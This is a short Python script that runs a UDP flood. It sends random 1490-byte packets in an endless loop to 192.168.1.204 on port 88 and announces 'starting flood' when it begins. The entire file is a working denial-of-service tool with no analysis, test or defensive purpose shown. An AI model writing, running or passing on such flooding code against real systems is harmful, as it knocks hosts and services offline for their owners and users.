import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print('starting flood')
while True:
    sock.sendto(bytes, ('192.168.1.204', 88))
